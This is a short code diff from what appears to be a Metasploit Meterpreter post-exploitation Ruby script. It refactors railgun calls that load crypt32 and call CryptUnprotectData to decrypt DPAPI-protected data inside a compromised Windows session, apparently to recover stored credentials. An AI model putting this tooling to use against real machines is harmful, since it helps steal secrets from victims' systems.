@@ -86,13 +86,12 @@ end
 print_status("using output format(s): " + @output_format.join(", "))
 
 def prepare_railgun
-  rg = client.railgun
-  if (!rg.get_dll('crypt32'))
-    rg.add_dll('crypt32')
+  if (!client.railgun.get_dll('crypt32'))
+    client.railgun.add_dll('crypt32')
   end
 
-  if (!rg.crypt32.functions["CryptUnprotectData"])
-    rg.add_function("crypt32", "CryptUnprotectData", "BOOL", [
+  if (!client.railgun.crypt32.functions["CryptUnprotectData"])
+    client.railgun.add_function("crypt32", "CryptUnprotectData", "BOOL", [
         ["PBLOB","pDataIn", "in"],
         ["PWCHAR", "szDataDescr", "out"],
         ["PBLOB", "pOptionalEntropy", "in"],
@@ -105,7 +104,6 @@ def prepare_railgun
 end
 
 def decrypt_data(data)
-  rg = client.railgun
   pid = client.sys.process.open.pid
   process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
 
@@ -114,7 +112,7 @@ def decrypt_data(data)
 
   addr = [mem].pack("V")
   len = [data.length].pack("V")
-  ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
+  ret = client.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
   len, addr = ret["pDataOut"].unpack("V2")
   return "" if len == 0
   decrypted = process.memory.read(addr, len)
